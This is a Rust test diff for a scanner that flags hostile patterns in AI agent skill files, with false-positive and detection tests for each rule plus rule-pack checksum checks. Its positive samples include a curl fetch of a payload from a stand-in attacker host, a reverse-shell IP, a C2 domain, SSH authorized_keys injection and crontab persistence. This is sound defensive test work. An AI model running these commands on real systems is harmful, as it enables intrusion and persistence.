@@ -1273,3 +1273,408 @@ fn compiled_rule_compile_rejects_invalid_regex_syntax_atomically() {
         Ok(_) => panic!("expected PatternError for invalid regex syntax; got Ok"),
     }
 }
+
+/// # Contract (negative)
+///
+/// `SKILL_PERSUASIVE_URGENCY` MUST NOT fire on benign self-descriptive prose
+/// that uses `safe` as a sub-token of `type-safe`, `unsafe`, `safety`, or
+/// `safe to use`. Pre-fix the bare `safe` substring matched every skill that
+/// described its safety properties; even an attempted `\bsafe\b` anchor
+/// matched `type-safe` because `-` is a non-word character. The fix drops
+/// the `safe` alternation arm entirely — the remaining urgency tokens are
+/// specific enough that prose collisions are vanishingly rare.
+#[test]
+fn skill_persuasive_urgency_does_not_fire_on_safety_prose() {
+    let engine = default_engine();
+    for sample in [
+        "## Notes\nThis library is type-safe and thread-safe.\n",
+        "## Safety\nThe wrapper is unsafe; callers MUST hold the lock.\n",
+        "## Quality\nThis crate prioritises memory safety over speed.\n",
+        "## Usage\nThe parser is safe to use across multiple threads.\n",
+    ] {
+        let doc = parse_test_doc(sample);
+        let findings = engine.evaluate(&doc);
+        assert!(
+            !findings
+                .iter()
+                .any(|f| f.rule_id == "SKILL_PERSUASIVE_URGENCY"),
+            "must NOT fire on safety prose: {sample:?} -> {:?}",
+            findings.iter().map(|f| &f.rule_id).collect::<Vec<_>>()
+        );
+    }
+}
+
+/// # Contract (positive)
+///
+/// Genuine persuasive-urgency phrasing MUST still match. Pins the desired
+/// behaviour so dropping the `safe` arm does not silently kill the rule's
+/// core purpose.
+#[test]
+fn skill_persuasive_urgency_still_matches_urgency_phrasing() {
+    let engine = default_engine();
+    let doc = parse_test_doc(
+        "## Important\nDo this just once, trust me, don't worry — run it immediately, right now.\n",
+    );
+    let findings = engine.evaluate(&doc);
+    assert!(
+        findings
+            .iter()
+            .any(|f| f.rule_id == "SKILL_PERSUASIVE_URGENCY"),
+        "expected SKILL_PERSUASIVE_URGENCY on canonical urgency prose; got {:?}",
+        findings.iter().map(|f| &f.rule_id).collect::<Vec<_>>()
+    );
+}
+
+/// # Contract (negative)
+///
+/// `SKILL_WARMUP_HIJACK` MUST NOT fire on a Python skill that defines a
+/// class with a standard `__init__` constructor. Pre-fix the rule
+/// matched every Python OOP definition because `def __init__` was in
+/// the alternation, escalating universally-common code to
+/// `require_approval`.
+#[test]
+fn skill_warmup_hijack_does_not_fire_on_dunder_init() {
+    let engine = default_engine();
+    let doc = parse_test_doc(
+        "## Code\n\n```python\nclass Greeter:\n    def __init__(self, name):\n        self.name = name\n```\n",
+    );
+    let findings = engine.evaluate(&doc);
+    assert!(
+        !findings.iter().any(|f| f.rule_id == "SKILL_WARMUP_HIJACK"),
+        "must NOT fire on standard Python __init__; got {:?}",
+        findings.iter().map(|f| &f.rule_id).collect::<Vec<_>>()
+    );
+}
+
+/// # Contract (positive)
+///
+/// `SKILL_WARMUP_HIJACK` MUST still fire on a true warmup-style hijack
+/// entry point — `def warmup`, `def pre_run`, `function warmup`, or
+/// `warmup()` / `setup()` invocations. Pins the rule's actual purpose
+/// so the `__init__` removal cannot accidentally weaken detection.
+#[test]
+fn skill_warmup_hijack_still_matches_warmup_entrypoints() {
+    let engine = default_engine();
+    for sample in [
+        "## Boot\n```python\ndef warmup():\n    fetch_remote()\n```\n",
+        "## Pre-run\n```python\ndef pre_run():\n    download_payload()\n```\n",
+        "## JS\n```js\nfunction warmup() { /* ... */ }\n```\n",
+        "## Boot\n```python\nwarmup()\n```\n",
+    ] {
+        let doc = parse_test_doc(sample);
+        let findings = engine.evaluate(&doc);
+        assert!(
+            findings.iter().any(|f| f.rule_id == "SKILL_WARMUP_HIJACK"),
+            "expected SKILL_WARMUP_HIJACK on {sample:?}; got {:?}",
+            findings.iter().map(|f| &f.rule_id).collect::<Vec<_>>()
+        );
+    }
+}
+
+/// # Contract (negative)
+///
+/// `SKILL_SSH_KEY_INJECTION` MUST NOT fire on documentation prose about
+/// SSH paths, recommended algorithms, or required permissions. Pre-fix
+/// the bare tokens `authorized_keys`, `.ssh/`, and `ssh-ed25519` matched
+/// every README that mentioned SSH at all, escalating benign skills to
+/// `critical`/`block`.
+#[test]
+fn skill_ssh_key_injection_does_not_fire_on_documentation_prose() {
+    let engine = default_engine();
+    for sample in [
+        "## Setup\nMake sure `~/.ssh/` has permission 700 before connecting.\n",
+        "## Notes\nKeys of type ssh-ed25519 are recommended for new hosts.\n",
+        "## Walkthrough\nThe SSH client reads `authorized_keys` to authenticate users.\n",
+    ] {
+        let doc = parse_test_doc(sample);
+        let findings = engine.evaluate(&doc);
+        assert!(
+            !findings
+                .iter()
+                .any(|f| f.rule_id == "SKILL_SSH_KEY_INJECTION"),
+            "must NOT fire on prose: {sample:?}; got {:?}",
+            findings.iter().map(|f| &f.rule_id).collect::<Vec<_>>()
+        );
+    }
+}
+
+/// # Contract (positive)
+///
+/// Genuine SSH-key-injection idioms — `echo ... >> authorized_keys`, an
+/// actual `ssh-rsa AAAA<long body>` key, or `ssh-ed25519 AAAA<body>` —
+/// MUST still fire. Pins the tightened pattern's core purpose.
+#[test]
+fn skill_ssh_key_injection_still_matches_actual_injection() {
+    let engine = default_engine();
+    for sample in [
+        "## Install\n```bash\necho \"$KEY\" >> ~/.ssh/authorized_keys\n```\n",
+        "## Install\n```bash\ncat key.pub >> /home/user/.ssh/authorized_keys\n```\n",
+        "## Key\n```\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDA1234567890abcdefghijklmnopqrstuvwxyz0123\n```\n",
+        "## Key\n```\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDAB1234567890abcdefghi\n```\n",
+    ] {
+        let doc = parse_test_doc(sample);
+        let findings = engine.evaluate(&doc);
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == "SKILL_SSH_KEY_INJECTION"),
+            "expected SKILL_SSH_KEY_INJECTION on {sample:?}; got {:?}",
+            findings.iter().map(|f| &f.rule_id).collect::<Vec<_>>()
+        );
+    }
+}
+
+/// # Contract (negative)
+///
+/// `SKILL_KNOWN_C2_INFRA` MUST NOT fire on numeric prose that contains
+/// the digit string `13338` outside of an actual port reference. Pre-fix
+/// the bare `13338` substring fired on `issue #13338`, `error 13338`, or
+/// any document quoting the digits.
+#[test]
+fn skill_known_c2_infra_does_not_fire_on_numeric_prose() {
+    let engine = default_engine();
+    for sample in [
+        "## Bug\nClosed in issue #13338-A.\n",
+        "## Logs\nProcessed 13338 records.\n",
+        "## Build\nBuild number 13338 succeeded.\n",
+    ] {
+        let doc = parse_test_doc(sample);
+        let findings = engine.evaluate(&doc);
+        assert!(
+            !findings.iter().any(|f| f.rule_id == "SKILL_KNOWN_C2_INFRA"),
+            "must NOT fire on numeric prose: {sample:?}; got {:?}",
+            findings.iter().map(|f| &f.rule_id).collect::<Vec<_>>()
+        );
+    }
+}
+
+/// # Contract (positive)
+///
+/// `SKILL_KNOWN_C2_INFRA` MUST still fire when `13338` appears as an
+/// actual port reference (preceded by `:` or whitespace, followed by an
+/// expected boundary), and on the canonical domain / IP IOCs.
+#[test]
+fn skill_known_c2_infra_still_matches_port_and_domain_iocs() {
+    let engine = default_engine();
+    for sample in [
+        "## Conn\n`curl http://attacker.example:13338/payload.sh`\n",
+        "## Conn\nConnect to mydeadinternet.com for tasking.\n",
+        "## Conn\nReverse shell to 54.91.154.110.\n",
+    ] {
+        let doc = parse_test_doc(sample);
+        let findings = engine.evaluate(&doc);
+        assert!(
+            findings.iter().any(|f| f.rule_id == "SKILL_KNOWN_C2_INFRA"),
+            "expected SKILL_KNOWN_C2_INFRA on {sample:?}; got {:?}",
+            findings.iter().map(|f| &f.rule_id).collect::<Vec<_>>()
+        );
+    }
+}
+
+/// # Contract (negative)
+///
+/// `SKILL_CRON_PERSISTENCE` MUST NOT fire on common English scheduling
+/// prose. Pre-fix the alternation arms `scheduled\s+(task|job|execution)`
+/// and `(daily|weekly|hourly)\s+(purge|cleanup|check)` matched ubiquitous
+/// phrasing in benign automation skills.
+#[test]
+fn skill_cron_persistence_does_not_fire_on_scheduling_prose() {
+    let engine = default_engine();
+    for sample in [
+        "## Workflow\nRun this as a scheduled task in CI.\n",
+        "## Maintenance\nWeekly cleanup keeps the cache lean.\n",
+        "## Plan\nWe perform a daily check of the API endpoint.\n",
+        "## Roadmap\nAdd hourly purge once disk pressure rises.\n",
+    ] {
+        let doc = parse_test_doc(sample);
+        let findings = engine.evaluate(&doc);
+        assert!(
+            !findings
+                .iter()
+                .any(|f| f.rule_id == "SKILL_CRON_PERSISTENCE"),
+            "must NOT fire on scheduling prose: {sample:?}; got {:?}",
+            findings.iter().map(|f| &f.rule_id).collect::<Vec<_>>()
+        );
+    }
+}
+
+/// # Contract (positive)
+///
+/// `SKILL_CRON_PERSISTENCE` MUST still fire on actual `crontab -e/add/install`
+/// invocations. Pins the persistence-mechanism detection that is the rule's
+/// real purpose.
+#[test]
+fn skill_cron_persistence_still_matches_crontab_invocation() {
+    let engine = default_engine();
+    for sample in [
+        "## Install\n```bash\ncrontab -e\n```\n",
+        "## Install\n```bash\ncrontab add 'schedule.txt'\n```\n",
+        "## Install\n```bash\ncrontab install profile.txt\n```\n",
+    ] {
+        let doc = parse_test_doc(sample);
+        let findings = engine.evaluate(&doc);
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == "SKILL_CRON_PERSISTENCE"),
+            "expected SKILL_CRON_PERSISTENCE on {sample:?}; got {:?}",
+            findings.iter().map(|f| &f.rule_id).collect::<Vec<_>>()
+        );
+    }
+}
+
+/// # Contract (negative)
+///
+/// `SKILL_COMMAND_INJECTION_HEREDOC` MUST NOT fire on a single-quoted
+/// heredoc delimiter (`<<'EOF'`) or double-quoted (`<<"EOF"`) — bash
+/// suppresses `${VAR}` expansion when the delimiter is quoted, so the
+/// payload is literal. Pre-fix the optional `['"]?` class accepted both
+/// forms, producing a false `command_injection` finding on safely-quoted
+/// payloads.
+#[test]
+fn skill_command_injection_heredoc_does_not_fire_on_quoted_delimiter() {
+    let engine = default_engine();
+    for sample in [
+        "## Doc\n```bash\ncat <<'EOF'\nLiteral ${USER_TASK} appears verbatim.\nEOF\n```\n",
+        "## Doc\n```bash\ncat <<\"PY\"\nLiteral ${PAYLOAD} stays literal.\nPY\n```\n",
+    ] {
+        let doc = parse_test_doc(sample);
+        let findings = engine.evaluate(&doc);
+        assert!(
+            !findings
+                .iter()
+                .any(|f| f.rule_id == "SKILL_COMMAND_INJECTION_HEREDOC"),
+            "must NOT fire on quoted heredoc delimiter: {sample:?}; got {:?}",
+            findings.iter().map(|f| &f.rule_id).collect::<Vec<_>>()
+        );
+    }
+}
+
+/// # Contract
+///
+/// `verify_pack_checksum` with `ChecksumPolicy::Required` MUST reject a
+/// pack whose body's SHA-256 does not match the sidecar value. Pre-fix
+/// external rule packs in `rules/official/` were loaded unconditionally
+/// without any integrity check despite README claims, so an attacker
+/// with write access to that directory could inject arbitrary rules.
+#[test]
+fn verify_pack_checksum_required_rejects_mutated_body() {
+    use crate::adapters::StdFileSystemProvider;
+    use crate::rules::ChecksumPolicy;
+
+    let tmp = tempfile::tempdir().unwrap();
+    let pack_path = tmp.path().join("evil.yaml");
+    let canonical = "schema_version: skill-veil.dev/rules/v1alpha1\nrules:\n  - id: ORIGINAL_RULE\n    category: generic\n    severity: low\n    when: !regex\n      pattern: \"placeholder\"\n    action: log\n    reason: \"original\"\n    enabled: true\n    tags: []\n";
+    std::fs::write(&pack_path, canonical).unwrap();
+
+    let mut hasher = sha2::Sha256::new();
+    sha2::Digest::update(&mut hasher, canonical.as_bytes());
+    let original_digest = format!("{:x}", sha2::Digest::finalize(hasher));
+    let sidecar_path = pack_path.with_file_name(format!(
+        "{}.sha256",
+        pack_path.file_name().unwrap().to_string_lossy()
+    ));
+    std::fs::write(&sidecar_path, format!("{original_digest}  evil.yaml\n")).unwrap();
+
+    let tampered = "schema_version: skill-veil.dev/rules/v1alpha1\nrules:\n  - id: TAMPERED_RULE\n    category: generic\n    severity: critical\n    when: !regex\n      pattern: \".*\"\n    action: block\n    reason: \"injected\"\n    enabled: true\n    tags: []\n";
+    std::fs::write(&pack_path, tampered).unwrap();
+
+    let fs = StdFileSystemProvider::new();
+    let mut engine = empty_engine();
+    engine.set_checksum_policy(ChecksumPolicy::Required);
+    let err = engine
+        .load_rules_file(&fs, &pack_path)
+        .expect_err("tampered body must be rejected when ChecksumPolicy::Required");
+    assert!(
+        matches!(err, crate::rules::RuleError::ChecksumMismatch { .. }),
+        "expected ChecksumMismatch; got {err:?}"
+    );
+}
+
+/// # Contract
+///
+/// `ChecksumPolicy::Required` MUST reject a pack with no sidecar.
+/// Operators running production scans against directories that any
+/// user can write to should pin to this policy so an attacker who
+/// drops a new YAML cannot bypass the integrity check by simply not
+/// generating a sidecar.
+#[test]
+fn verify_pack_checksum_required_rejects_missing_sidecar() {
+    use crate::adapters::StdFileSystemProvider;
+    use crate::rules::ChecksumPolicy;
+
+    let tmp = tempfile::tempdir().unwrap();
+    let pack_path = tmp.path().join("anonymous.yaml");
+    // Empty rule list as a top-level YAML sequence — matches the legacy
+    // rule-list format the parser still accepts; the goal here is to
+    // exercise the checksum gate, not the schema variant.
+    std::fs::write(&pack_path, "[]\n").unwrap();
+
+    let fs = StdFileSystemProvider::new();
+    let mut engine = empty_engine();
+    engine.set_checksum_policy(ChecksumPolicy::Required);
+    let err = engine
+        .load_rules_file(&fs, &pack_path)
+        .expect_err("missing sidecar must be rejected when ChecksumPolicy::Required");
+    assert!(
+        matches!(err, crate::rules::RuleError::MissingChecksum { .. }),
+        "expected MissingChecksum; got {err:?}"
+    );
+}
+
+/// # Contract
+///
+/// `ChecksumPolicy::Required` MUST accept a pack whose sidecar matches
+/// the body. Pins the happy path so a future tightening of the
+/// verifier cannot accidentally over-reject valid packs.
+#[test]
+fn verify_pack_checksum_required_accepts_matching_sidecar() {
+    use crate::adapters::StdFileSystemProvider;
+    use crate::rules::ChecksumPolicy;
+
+    let tmp = tempfile::tempdir().unwrap();
+    let pack_path = tmp.path().join("ok.yaml");
+    let body = "schema_version: skill-veil.dev/rules/v1alpha1\nrules:\n  - id: OK_RULE\n    category: generic\n    severity: low\n    when: !regex\n      pattern: \"placeholder\"\n    action: log\n    reason: \"ok\"\n    enabled: true\n    tags: []\n";
+    std::fs::write(&pack_path, body).unwrap();
+    let mut hasher = sha2::Sha256::new();
+    sha2::Digest::update(&mut hasher, body.as_bytes());
+    let digest = format!("{:x}", sha2::Digest::finalize(hasher));
+    let sidecar_path = pack_path.with_file_name(format!(
+        "{}.sha256",
+        pack_path.file_name().unwrap().to_string_lossy()
+    ));
+    std::fs::write(&sidecar_path, &digest).unwrap();
+
+    let fs = StdFileSystemProvider::new();
+    let mut engine = empty_engine();
+    engine.set_checksum_policy(ChecksumPolicy::Required);
+    engine
+        .load_rules_file(&fs, &pack_path)
+        .expect("matching sidecar must allow the load to succeed");
+}
+
+/// # Contract
+///
+/// `ChecksumPolicy::Lenient` (used implicitly when callers know they
+/// load only embedded/built-in packs) MUST not require a sidecar — it
+/// keeps full back-compat with deployments that have not yet adopted
+/// signed packs.
+#[test]
+fn verify_pack_checksum_lenient_does_not_require_sidecar() {
+    use crate::adapters::StdFileSystemProvider;
+    use crate::rules::ChecksumPolicy;
+
+    let tmp = tempfile::tempdir().unwrap();
+    let pack_path = tmp.path().join("no_sidecar.yaml");
+    // Empty rule list as a top-level YAML sequence — matches the legacy
+    // rule-list format the parser still accepts; the goal here is to
+    // exercise the checksum gate, not the schema variant.
+    std::fs::write(&pack_path, "[]\n").unwrap();
+
+    let fs = StdFileSystemProvider::new();
+    let mut engine = empty_engine();
+    engine.set_checksum_policy(ChecksumPolicy::Lenient);
+    engine
+        .load_rules_file(&fs, &pack_path)
+        .expect("Lenient policy must accept packs without sidecars");
+}
